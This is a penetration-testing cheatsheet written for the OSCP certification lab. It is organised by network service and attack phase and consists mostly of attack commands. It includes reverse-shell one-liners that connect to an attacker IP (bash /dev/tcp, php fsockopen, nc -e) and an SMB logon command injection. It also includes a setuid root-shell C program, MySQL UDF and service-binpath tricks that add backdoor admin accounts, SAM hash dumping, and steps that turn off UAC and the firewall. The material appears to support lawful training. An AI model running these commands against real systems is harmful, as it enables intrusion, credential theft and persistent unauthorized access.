# OSCP Cheatsheet

### [1. Recon](#RECON)  
### [2. Services](#SERVICES)  
* [FTP - TCP 21](#FTP---TCP-21) 
* [SSH - TCP 22](#SSH---TCP-22)  
* [HTTP - TCP 80/8080/443/8443](#HTTP---TCP-80/8080/443/8443)
* [Telnet - TCP 23](#Telnet---TCP-23)  
* [SMTP - TCP 25](#SMTP---TCP-25)
* [DNS - TCP 53](#DNS---TCP-53)
* [TFTP - UDP 69](#TFTP---UDP-69)
* [Remote Procedure Call - TCP 111](#Remote-Procedure-Call---TCP-111)
* [Ident - TCP 113](#Ident---TCP-113)
* [SMB Netbios SMBD - TCP 135-139,445](#SMB-NETBIOS-SMBD---TCP-135-139445)
* [SMBD Samba - TCP 139](#SMBD-SAMBA---TCP-139)
* [RPC/MSRPC - TCP 135](#RPCMSRPC---TCP-135)
* [IMAP - TCP 143](#IMAP---TCP-143)
* [SNMP - UDP 161](#SNMP---UDP-161)
* [ISAKMP - UDP 500](#ISAKMP---UDP-500)
* [MSSQL Server - TCP/UDP 1433/1434](#MSSQL-Server---TCPUDP-14331434)
* [Oracle SQL Database Listener - TCP 1521](#Oracle-SQL-Database-Listener---TCP-1521)
* [MySQL - TCP 3306](#MySQL---TCP-3306)
* [RDP - TCP 3389](#RDP---TCP-3389)
* [VNC - TCP 5800, 5900](#RealVNC-and-VNC---TCP-5800-5900)
* [IRC - TCP 6660-6669,6697,67000](#irc---tcp-6660-6669669767000)
* [RDP - TCP 3389](#RDP---TCP-3389)  

### [3. Web](#WEB)  
### [4. Initial Exploitation](#INITIAL-EXPLOITATION)  
### [5. Linux Privilege Escalation](#LINUX-PRIVESC)  
### [6. Windows Privilege Escalation](#WINDOWS-PRIVESC)  
### [7. Msfvenom Payloads](#MSFVENOM-PAYLOADS)  
### [8. Compiling Exploit Code](#COMPILING-EXPLOIT-CODE)  
### [9. Other](#OTHER-THINGS)  


# RECON

Enumeration Mindmap: https://github.com/DigitalAftermath/EnumerationVisualized/wiki

Port Scans:
(NOTE: Heavy scanning may result in ports being filtered/closed - wait <15 minutes to be unbanned)
```bash
# PORT SCANS
$ nmap -sC -sV -oA 10.10.10.29          (IPPSEC)
$ nmap 10.11.1.71 --top-ports 20 --open
$ nmap 10.11.1.71 -p- -sV

# NSE
$ ls -l /usr/share/nmap/scripts/*ssh*
$ nmap -v -p 139,445 --script=smb-vuln-ms17-010.nse --script-args=unsafe=1 10.11.1.31
```

OS Fingerprinting:
```bash
$ xprobe2 -v -p tcp:80:open 192.168.6.66
```

Kali Apache server not working properly? Try use:
`$ python -m SimpleHTTPServer 8080`

# SERVICES

### FTP - TCP 21

FTP Recon
* It is NOT always about extracting creds / putting in a reverse-shell for LFI => code exec.
* Sometimes FTP is there so you can enumerate additional services in the box => find exploits => code exec.
* __Look at 10.11.1.226 as an example__

Fingerprint / access FTP server:
```
# cmdline access
$ nc 10.11.1.125 21
$ telnet 10.11.1.125 21
$ ftp 10.11.1.125

# browser access
ftp://10.11.1.125
```

File get/put methods:
```bash
# Standard
ftp> get [ filename ]
ftp> put reverse-shell.txt

# Wget
wget -r ftp://user:pass@10.11.1.125/\\..%2fConfigs%2fsettings.cfg
```

Directory traversal
```bash
# Navigating dirs with whitespaces
ftp> ls ../../../../Docume~1/

# Directory Traversal / Bypass (Femitter FTP)
ftp> get ../\../\../\../\boot.ini
200 Port command successful.
150 Opening data connection for ../../../boot.ini.
226 File sent ok
ftp> dir ../\../\../\temp/
```

CompleteFTP Server - Directory Traversal
* https://www.exploit-db.com/exploits/11973

ProFTPD 1.3.3a
* (Worked) https://github.com/Muhammd/ProFTPD-1.3.3a/blob/master/ProFTPD_exploit.py

### SSH - TCP 22

Fingerprint server/OS, SSH key.
Basic auth-bypass (user=Patrick pass=Patrick) => Privesc `$ sudo su` + `$ su root`


### HTTP - TCP 80/8080/443/8443

See section "WEB" for juicy web stuff.

### Telnet - TCP 23

Stuff

### SMTP - TCP 25

SMTP enum tools
```bash
$ smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t [target]
```

Manual fingerprinting
```bash
$ echo VRFY 'admin' | nc -nv -w 1 $target_ip 25
```

### DNS - TCP 53

NOTE:
* If there is TCP running on the machine, then there may be a TFTPd service running (scan UDP port 69).
* Vulnerability may be related to TFTPd service running on port 69.

Enumeration
```bash
$ nmap -p53 [target] --script=*dns*
```

Zone Transfers
```bash
$ host -l <domain name> <dns server>
$ host -l thinc.local 10.11.1.221               # host zone-transfer
$ root@kali# dig axfr thinc.local @10.11.1.221  # dig zone-transfer
```

Changing nameserver to target IP, revealing additional domains / directories.
```bash
root@kali#  nano /etc/resolv.conf
#nameserver 10.211.55.1                           # comment out default config
#nameserver fe80::21c:42ff:fe00:18%eth0           # comment out default config
nameserver [ target ip ]

root@kali#  nslookup
> friendzoneportal.red
```

Zone Transfers to reveal subdomains
```bash
root@kali# dig axfr friendzoneportal.red @10.10.10.123
; <<>> DiG 9.10.3-P4-Debian <<>> axfr friendzoneportal.red @10.10.10.123
admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
files.friendzoneportal.red. 604800 IN	A	127.0.0.1
imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
```

### TFTP - UDP 69

Allied Telesyn TFTP Server (AT-TFTP) 1.9 Remote Buffer Overflow
* Public exploit: https://github.com/shauntdergrigorian/cve-2006-6184
* MSF exploit: https://www.exploit-db.com/exploits/16350


### Kerberos - TCP 88

Open port 88 = machine is likely a Windows Domain Controller.

Privilege escalation vulnerability: MS14-068
* https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py
* https://www.trustedsec.com/2014/12/ms14-068-full-compromise-step-step/

### POP3 - TCP 110

```bash
$ telnet [target]
> USER bob@target
> PASS admin

> list                  # List all emails
> retr 5                # Retrive email number 5, for example
```

### Remote Procedure Call - TCP 111

Exploit NFS shares
```bash
$ rpcinfo -p [ target IP ] | grep 'nfs'
$ rpcbind -p [ target IP ]                        # Look for NFS-shares
$ showmount -e [ target IP ]                      # show mountable directories
$ mount -t nfs [target IP]:/ /mnt -o nolock       # mount remote share to your local machine
$ df -k                                           # show mounted file systems
```

Exploit NFS shares for privesc:
```bash
$ showmount -e 192.168.xx.53
Export list for 192.168.xx.53:
/shared 192.168.xx.0/255.255.255.0
$ mkdir /tmp/mymount
/bin/mkdir: created directory '/tmp/mymount'
$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
$ cat /root/Desktop/exploit.c
#include <stdio.h>
#include <unistd.h>
int main(void)
{
setuid(0);
setgid(0);
system("/bin/bash");
}
gcc exploit.c -m32 -o exploit

$ cp /root/Desktop/x /tmp/mymount/
$ chmod u+s exploit
```

Attack scenario: replace target SSH keys with your own
```
$ mkdir -p /root/.ssh
$ cd /root/.ssh/
$ ssh-keygen -t rsa -b 4096
Enter file in which to save the key (/root/.ssh/id_rsa): hacker_rsa
Enter passphrase (empty for no passphrase): Just Press Enter
Enter same passphrase again: Just Press Enter
$ mount -t nfs 192.168.1.112:/ /mnt -o nolock
$ cd /mnt/root/.ssh
$ cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/
$ cat hacker_rsa.pub >> authorized_keys                     # add your public key to authorized_keys
$ ssh -i /root/.ssh/hacker_rsa root@192.168.1.112           # SSH to target using your private key
```

### Ident - TCP 113

Ident is a protocol that helps identify the user of a particular TCP connection.

Follow instructions to install ident-enum tool: http://pentestmonkey.net/tools/ident-user-enum


### IMAP - TCP 143

hMAilServer 4.4.2 - 'PHPWebAdmin' File Inclusion
* https://www.exploit-db.com/exploits/7012

### RPC/MSRPC - TCP 135

Rpcclient enumeration:
```bash
# Initial enum
$ rpcclient -U "" -N 10.11.1.136 -c $i
rpcclient> srvinfo
rpcclient> enumdomains
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> getdompwinfo

# Follow up enum
rpcclient> querygroup 0x200
rpcclient> querygroupmem 0x200
rpcclient> queryuser 0x3601
rpcclient> getusrdompwinfo 0x3601
```


### SMB NETBIOS SMBD - TCP 139,445
SMB is a communications protocol primarily designed for file sharing and printer sharing. It is not intended as a general networking tool.  

Netbios is an API for the SMB protocol. A SMB client will interact with a Netbios API to send an SMB command to an SMB server, then listen for replies.

SMB/Netbios enumeration
```bash
# Tools
$ nmblookup -A 10.11.1.XXX
$ smbclient //MOUNT/share -I 10.11.1.XXX -N
$ rpcclient -U "" 10.11.1.XXX
^RPCCLIENT ENUM GUIDE: https://github.com/Resilient-Ninja/Infrastructure-PenTest/blob/master/Vulnerability%20Analysis.md
$ enum4linux 10.11.1.XXX        // enum info from Windows and Samba hosts 
$ nbtscan 10.11.1.XXX           // Netbios nameserver scanner

# Find named pipes
`msfconsole> use auxiliary/scanner/smb/pipe_auditor`
```

Accessing shared dirs:
* `smbclient \\\\10.11.1.75\\Users` or just `smbclient \\\\10.11.1.75\\{SHARE_NAMES}`
* `smb:\> put src_file remote_file`
* `smb:\> get remote_file`
* Put nc.exe => reverse shell
* Get password files => access via. ssh/rdp

Access SMB shares with spaces in name:
```bash
$ smbclient \\\\10.11.1.136\\Bob\ Share
```

SMB "Logon" reverse shell:
```bash
smb> logon "/=`nc 192.168.1.10 4444 -e /bin/bash
```

MS17-010 Code Exec
* `PsExec64.exe \\10.11.1.49 -u Alice -p aliceishere ipconfig` (see more cmds: https://ss64.com/nt/psexec.html)
* `PsExec -u tom -p iamtom \\TOMSCOMP C:\path\to\nc.exe IP_OF_ATTACKING_SYSTEM 8080 -e C:\windows\system32\cmd.exe`
* `runas`
* `nc.exe 10.11.0.42 443 -e cmd.exe`
* Add new admin account: https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit

Privesc
* Mount shared drives:  
```bash
$ net use z: \\10.11.1.49\Users /user:alice aliceishere     // mount with auth
$ net use z: \\ACCESS\SHARENAME$                            // mount without auth
```

Working exploits:
* [MS08-067] NetAPI module in Windows SMB
* [MS17_010] Eternal blue detection: `use auxiliary/scanner/smb/smb_ms17_010`
* [MS17-010 ALTERNATIVE METHOD]: Adding new admin account https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit

### SMBD SAMBA - TCP 139

SMBD/Sambda is a server to provide SMB service to clients

Working exploits:
* Samba 2.2.x remote buffer overflow: https://www.exploit-db.com/exploits/7

Samba Symlink Directory Traversal (Samba 3.0.x)
* See for more info: https://packetstormsecurity.com/files/85957/Samba-Remote-Directory-Traversal.html
* Automatic: `Metasploit> use auxiliary/admin/smb/samba_symlink_traversal`
* Manual: `smb> symlink <oldname> <newname>`


### SNMP - UDP 161

SNMP is an app-layer protocol for collecting and managing information about devices within a network.  

SNMP enumeration:  
(find further info about devices/software with vulns to gain a shell)
```
$ snmpwalk -c [community string] -v1 [ target ]
$ onesixtyone [ target ] -c community.txt
$ snmpenum
$ snmp-check [ target ]
```

Snmpwalk brute-force script:
```bash
#!/bin/bash
while read line; do
    echo "Testing $line"; snmpwalk -c $line -v1 10.10.10.105
done < community.txt
```

Community string wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt


### ISAKMP - UDP 500

```bash
$ ike-scan -M [ target ]
```

### MSSQL Server - TCP/UDP 1433/1434

Testing SQL Servers:
* Guide 1: https://pentestlab.blog/2013/03/18/penetration-testing-sql-servers/
* Guide 2: https://www.cybrary.it/0p3n/exploiting-ms-sql-server-metasploit-fast-track/

Confirm MSSQL Server
```bash
# Check either TCP and UDP ports
$ nmap -sU -p1434 [target]  
$ nmap -p1433 [target]
```

Metasploit SQL Server:
```bash
msf> use auxiliary/scanner/mssql/mssql_ping     # SQL Server num
msf> use auxiliary/scanner/mssql/mssql_login    # SQL Server login brute-force

msf> use auxiliary/admin/mssql/mssql_enum       # post-exploit enum
msf> use auxiliary/admin/mssql/mssql_exec       # if 'xp_cmdshell' is enabled, execute system commands
```

MSSQL Server - default credentials:
* http://support.webecs.com/kb/a867/what-is-the-default-password-for-the-sa-login.aspx
* https://support.microsoft.com/en-au/help/321081/installation-of-msde-creates-an-sa-account-with-a-blank-password-in-vi


### Oracle SQL Database Listener - TCP 1521

Look at notes from pwning `10.11.1.202`.

Check connection => enumerate login creds => Sqlplus login => extract data
```bash
$ tnscmd10g status --indent -h [target]             # check connection to DB
$ oscanner -s [target] -P 1521                      # enumerate users / default creds
$ sqlplus SYS/SYS@10.11.1.202/ACME 'as sysdba'      # login
```

### MySQL - TCP 3306

Connect:
```
$ mysql -u root -p
```

Drop to a shell (as the user running MySQL):
```
mysql> \! /bin/bash
```

MySQL root to system-root for windows/linux - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/: 
```bash
$ USE mysql;
$ CREATE TABLE mytbl(line blob);
$ INSERT INTO mytbl values(load_file('C://xampplite//htdocs //lib_mysqludf_sys.dll'));
$ SELECT * FROM mysql.mytbl INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
$ CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
$ SELECT sys_exec("net user testu P@ssw0rd /add");
$ SELECT sys_exec("net localgroup Administrators testu /add");
```

### RDP - TCP 3389

If you have credentials, you can enable the RDP service then log in:
```powershell
# METHOD 1
$ netsh firewall set service RemoteDesktop enable

# METHOD 2
$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# METHOD 3
$ reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f

# METHOD 4
$ sc config TermService start= auto
$ net start Termservice
$ netsh.exe firewall add portopening TCP 3389 "Remote Desktop"

# METHOD 5
$ netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [TCP 3389]" enable=yes 
profile=private,domain localport=3389 protocol=tcp

# METHOD 6
$ netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [UDP 3389]" enable=yes 
profile=private,domain localport=3389 protocol=udp

# METHOD 7 - add user to RDP group
$ net user $username $password /add
$ net localgroup "Remote Desktop Users" $username /add
```

### RealVNC and VNC - TCP 5800, 5900

RealVNC - VNC over HTTP:
```bash
$ curl -L 10.11.1.227 http://[target]:5800
```

VNC login brute-force:
```bash
$ hydra -s 5900 -P /usr/share/wordlists/rockyou.txt [target] vnc
```

VNC authentication bypass:
```bash
# First, check if VNC service is vulnerable to auth bypass:
https://github.com/curesec/tools/blob/master/vnc/vnc-authentication-bypass.py
# If vulnerable, run manual exploit:
https://github.com/arm13/exploits-1/blob/master/vncpwn.py
# If that doesn't work, try MSF module:
msf> use auxiliary/admin/vnc/realvnc_41_bypass
```

VNC password cracking:
* https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/


### IRC - TCP 6660-6669,6697,67000

IRC enum:
* Start `hexchat` in Kali.
* Add IRC channel `TargetIP/6697` + connect to channel.
* View output/look for version numbersc -> searchsploit/Google

# WEB

```bash
$ curl -i -L 10.11.1.71    # Follow re-directs
$ gobuster -u http://10.11.1.71 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```

Denied from accessing /robots.txt?
* Try change the user agent i.e. `curl -v http://10.11.1.39/robots.txt -H "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)"`

Exploit code not working? Try:
* Full directory paths to binaries and your files e.g. `/usr/bin/wget http:example.com -o /full/path/to/file.txt`

WEBDAV vulns - using tools . 
https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp  
http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html  
```bash
$ davtest -url 10.11..113                                 # test for webdav vulns
$ davtest -url http://10.11.1.13                          # upload file from local to remote dir (HTTP PUT)
          -uploadfile rshell.asp -uploadloc rshell.html
$ cadaver
dav:!> open 10.11.1.13                                    # open connection to URL
dav:!> move '/rshell.txt' to '/rshell.asp'                # move .txt -> .asp (now executable)
```

WEBDAV vulns - manual
```bash
$ curl -T '/path/to/local/file.txt' 'http://10.11.1.13/'                              # upload file to remote
$ curl -v -X MOVE -H 'Destination: http://10.11.1.13/[new]' 'http://10.11.1.13/[old]' # move .ext1 -> .ext2
```

Apache
* Log paths: https://wiki.apache.org/httpd/DistrosDefaultLayout

phpLiteAdmin 1.9.3 Remote PHP Code Injection:
* https://v3ded.github.io/ctf/zico2.html

LFI / RFI
(LFI = HIGH CHANCE OF RFI, SO TRY TO INCLUDE HTTP://ATTACKER/RSHELL.PHP)
```
# Append NULL bytes (prevent .ext concat to the end by application)
http://example.com/index.php?page=../../../etc/passwd%00
http://example.com/index.php?page=../../../etc/passwd%en
http://example.com/index.php?page=../../../etc/passwd%00%en
```

PHP
* Check `phpinfo()`
* RFI: If reverse-shell doesn't work, include `<?php phpinfo();?>` to check for banned functions
* PHP reverse shell:
```
$ bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
$ /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
$ php -r '$sock=fsockopen("10.10.14.3",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Apache
* Exposed `server-status` page: https://github.com/mazen160/server-status_PWN. Listen in to all requests by clients using this tool, including cookies.

ColdFusion vulns
* https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
* https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/
* ColdFusion LFI: http://hatriot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/

MiniShare HTTP Server 1.4.1
* https://github.com/codingo/OSCP-2/blob/master/Exploits/MS_v1.4.1.py

Tomcat Web Manager (JSP reverse shell upload)
* Default creds: `tomcat:tomcat`
* https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/

Microsoft IIS 5.0
* WebDAV Remote Code Execution (3) (xwdav): https://www.exploit-db.com/exploits/51
* Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow: https://www.exploit-db.com/exploits/9541

# INITIAL EXPLOITATION

Reverse shell tips:
* If a standard reverse-shell such as `nc 10.11.0.222 4444 -e /bin/bash` doesn't work, use `exploit/multi/handler` to catch the connection.

Pay

__##################### WARNING: METERPRETER PAYLOADS ARE RESTRICTED ####################__  
Meterpreter reverse-shell + usage:
```bash
# Windows
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[host] LPORT=444 -f exe -o win_rshell.exe

# Linux
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[host] LPORT=444 -f elf -o lin_rshell.elf

# Use reverse-shell
msf> use exploit/multi/handler
```

Meterpreter migration (if your shell is unstable / process closes or crashes)
```bash
meterpreter > ps                # get PID of process of the same/lower privileges 
PID   PPID  Name              Arch  Session  User                 Path
---   ----  ----              ----  -------  ----                 ----
1548  1516  explorer.exe      x86   0        JOE\joe              C:\WINDOWS\Explorer.EXE

meterpreter > migrate 1548
[*] Migrating from 3048 to 1548...
[*] Migration completed successfully.
```

__##################### WARNING: METERPRETER PAYLOADS ARE RESTRICTED ####################__  

Payload not working?
* Try another one.
* `/meterpreter/reverse_tcp`
* `/shell/reverse_tcp`
* `/vncinject/reverse_tcp`

Payload size is restricted?
* Look for a payload that has a smaller size than standard e.g. `reverse_nonx_tcp`.
* Run the script `/usr/share/metasploit-framework/tools/modules/payload_lengths.rb` to check the size of all payloads.

If reverse shell hangs / dies:
* Try a different port. E.g. 4444 doesn't work, try 443, 80 or 8080 (see your Nmap results) because a firewall may be disallowing all ports except certain ones.
* Try a bind shell instead of reverse shell.
* Try generate a different payload with `msfvenom -p` or find another payload online.

WINDOWS SERVER:
* Directory to binaries may use `C:\WINNT\System32` rather than `C:\WINDOWS\System32`

# LINUX PRIVESC

Privilege escalation guides:
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (manual)
* https://www.reddit.com/r/oscp/comments/9ystub/i_absolutely_suck_at_privilege_escalation/?st=JOQAMPYP&sh=8899be73

Automated Linux enumeration scripts:
* https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
* https://github.com/ankh2054/linux-pentest/blob/master/linuxprivchecker.py
* https://github.com/rebootuser/LinEnum
* https://tools.kali.org/vulnerability-analysis/unix-privesc-check

TTY spawn cheatsheet: https://netsec.ws/?p=337
* `python -c 'import pty; pty.spawn("/bin/sh")'`


Hardcoded credentials, backup ssh keys, interesting files
```
# Recursive grep, match regex pattern, ignoring case for all files from the root directory.
$ grep -Rei 'password|username|[pattern3]|[pattern4]' /

# Backups (Debian)
$ ls -l /var/backups
```

Quick Wins:
* Run Linux exploit suggester: https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
* Misconfigured /etc/sudoers:
```bash
# THIS HAS WORKED BEFORE: Due to misconfiguration in /etc/sudoers
$ sudo su	# execute su as root
$ su root	# become root
```

Sudo misconfiguration:


Localhost listening ports:
* Look for ports that were not exposed to your initial public nmap scan.
```bash
$ netstat -alntp
```

Exploit weak NFS permissions for privesc #1 (check `cat /etc/exports`):
(/etc/exports is table of local physical file systems on an NFS server that are accessible to NFS clients)
```bash
$ showmount -e 192.168.xx.53                               # check for 
shares
Export list for 192.168.xx.53:
/shared 192.168.xx.0/255.255.255.0
$ mkdir /tmp/mymount
/bin/mkdir: created directory '/tmp/mymount'
$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock # mount share
$ cat /root/Desktop/exploit.c
#include <stdio.h>
#include <unistd.h>
int main(void)
{
setuid(0);
setgid(0);
system("/bin/bash");
}
gcc exploit.c -m32 -o exploit

$ cp /root/Desktop/x /tmp/mymount/
$ chmod u+s exploit
```

Exploit weak NFS permissions for privesc #2
* https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/

/etc/fstab  (check `cat /etc/fstab`):
* Look for un-mounted file-systems
* Look for file-systems with vulnerabilities e.g. ReiserFS privesc

UDEV
* Guide: http://www.madirish.net/370
* Exploit Code: https://www.exploit-db.com/exploits/8478

Exploiting Crontabs / Cronjobs:
* Bad permissions /etc/crontab: https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/

Exploitable SUIDs / SGIDs:
* Generally, nothing in /bin, /sbin, /usr/bin would be exploitable. You should of course scan through the /bin, /sbin/ and /usr/bin directories to see anything strange.
* Look for SUID binaries in non-standard folders e.g. /tmp, /home/user, /etc, /opt, /usr/local/bin, which is where 3rd party applications are often stored.
* __GOAL: Find the sus binary -> analyse how it works by `./binary` or `strings binary` etc. -> think of ways to replace / write / execute something using the binary that will lead to root privs.__
```
# Example of exploitable SUIDs
/cp
/nmap
/vi
/vim.basic
/nano
/less
/more
/usr/bin/viewuser (HackTheBox)
/usr/local/bin/{REDACTED} (OSCP)
```

SUID: Exploit unquoted / non-fullpath binaries:
* EXAMPLE: '/usr/local/bin/brian' is a SUID binary that references SSH in the program, but is unquoted.
```bash
$ mv reverse-shell.sh /tmp/SSH       # STEP 1: Move reverse-shell.sh to /tmp folder, renamed to SSH.
$ export PATH=/tmp                   # STEP 2: Set home path to /tmp.
$ /usr/local/bin/brian               # STEP 3: Execute SUID => because home path is /tmp, the SUID will execute the fake "SSH" instead of the real SSH located at /bin/SSH.
                                     # Because the SUID is running as root and executes the reverse-shell, we will get a root shell.
```

Databases:
* Check for presence of both MYSQL and MARIADB.
* They may have two different types of databases to get creds / important info, so check for both.

# WINDOWS PRIVESC

Windows privesc:
* Automated scanner: https://github.com/azmatt/windowsEnum (automated)
* https://guif.re/windowseop?fbclid=IwAR0jmCV-uOLaUJCnKiGB2ZaDt9XZwlAGM3nTOH0GkS6c0hS63FFSGm97Tdc#Windows%20version%20map
* https://github.com/xapax/security/blob/master/privilege_escalation_windows.md
* http://www.fuzzysecurity.com/tutorials/16.html
* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

!! If a service is running as SYSTEM, you can try to replace the executable with a malicious exe !!
* Malicious exe: Add local user to Admin group | reverse shell
* Check for permissions of exe's: `icacls [service.exe]`
* Requires restarting service for system to rerun as your exe.
* Restarting might simply mean you have to access the service directly
    * E.g. `MYSQL> restart` rather than running commands on cmd to try restart.
    
Find Running Services:
```
$ sc query state=all
```

Dump passwords / hardcoded credentials:
```powershell
# Password hashes
$ reg.exe save hklm\sam c:\sam_backup
$ reg.exe save hklm\security c:\security_backup
$ reg.exe save hklm\system c:\system

# User password
$ type C:\Users\[username]\NTUSER.dat

# WebDAV passwords
$ /xampp/security/webdav.htpasswd
```
    
Cached Credentials:
```powershell
# CMDKEY: https://ss64.com/nt/cmdkey.html
$ cmdkey /list      
    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator

# RUNAS: https://ss64.com/nt/runas.html
$ runas /savecred /User:ACCESS\Administrator "cmd.exe /C type C:\Users\Administrator\Desktop\root.txt>C:\Users\noob\out.txt"
```

Tweak security:
```powershell
# Allow RDP
$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable UAC
$ reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system
$ reg setval -v EnableLUA -d 0 -t REG_DWORD -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system

# Refresh policies
$ gpupdate /force

# Disable firewall 1
$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# Disable firewall 2 - newer Windows versions
$ netsh Advfirewall set allprofiles state off
# Disable firewall 3 - older Windows versions
$ netsh firewall set opmode disable
```

Nestat:
* `netstat -alnp`: see what ports are on LISTENING state, but not pubicly accessible from the outside.
* There's often a SQL server/tomcat/smb/samba running, but not public facing.
* You can port-forward back to your machine and hit them with public exploits for root shell.
* E.g.:
```powershell
$ plink.exe -l root 10.11.0.42 -R 445:127.0.0.1:445      // forward target local p445 -> attacker p445
$ pth-winexe -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE // run cmd.exe
```

Accesschk.exe (find weak service/file/folder permissions):
* http://www.fuzzysecurity.com/tutorials/16.html
```
accesschk.exe -uwdqs Users c:\ /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

Badly configured services:
```powershell
# Vulnerable services
sc qc <vulnerable service name>
sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 

sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
net start <vulnerable-service>
```

Psexec.exe:
* https://pinkysplanet.net/escalating-privileges-in-windows-with-psexec-and-netcat/
* https://www.robvanderwoude.com/ntadmincommands.php#Cmd15

Net Use:
* https://www.robvanderwoude.com/ntadmincommands.php#Cmd15

Windows file transfer methods:
```powershell
# Run: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
$ cscript wget.vbs http://10.11.0.42/nc.exe

# tftp: set up tftp folder in Kali box
$ mkdir /tftp
$ atftpd --daemon --port 69 /tftp
$ cp /usr/share/windows-binaries/nc.exe /tftp/
# tftp: download nc.exe to target machine
cmd> tftp -i 10.11.0.63 get nc.exe
cmd> "Transfer successful: 59392 bytes in 31 seconds."

# (KALI) ftp - start FTP server
$ python -m pyftpdlib -p 21
# (TARGET) ftp - connect to server, get file
$ echo open 10.10.15.39 21> ftp.txt
$ echo USER anonymous>> ftp.txt
$ echo PASS anonymous@>> ftp.txt
$ echo bin>> ftp.txt
$ echo GET nc.exe>> ftp.txt
$ echo bye>> ftp.txt
$ ftp -v -n -s:ftp.txt

# Certutil ???
http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html

# Powershell method
(new-object System.Net.WebClient).DownloadString("http://www.mysite.com") # replicate Curl
(new-object System.Net.WebClient).DownloadData("http://www.mysite.com")   # replicate Curl
(new-object System.Net.WebClient).DownloadFile("http://www.mysite.com", 'C:\Temp\file') # replicate Wget
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; # ignore SSL warnings (add to lines above)

# Powershell method
$ impacket-smbserver files `pwd`            # @KALI: Set up a SMB server with files=share `pwd`=workingdir.
PS> xcopy \\10.10.14.3\files\rshell.exe .   # @TARGET: Copy rshell.exe from remote share to current dir.
```

# MSFVENOM PAYLOADS

Msfvenom commands:
* https://netsec.ws/?p=331

Encoders:
```bash
$ [msfvenom commands] -e x86/shikata_ga_nai
$ [msfvenom commands] -e x86/alpha_mixed
``

# COMPILING EXPLOIT CODE

Compilation tips:
* `./exploit` results in errors: compile in the host itself, Kali box or another machine.

Compilation commands:
```bash
# Compile Linux (cross architecture)
$ gcc -m32 -Wl,--hash-style=both exploit.c -o exploit

# Compile to Windows .exe from Linux Windows
$ i686-w64-mingw32-gcc 25912.c -o exploit.exe -lws2_32
$ wine exploit.exe
```

Exploit is in Python, but Python doesn't exist on the box:
* Use `pyinstaller` to transform python script -> binary.


# OTHER THINGS

__Maintaining access to a box with unstable shell__

__########### WARNING: METERPRETER IS RESTRICTED IN THE EXAM ###########__  
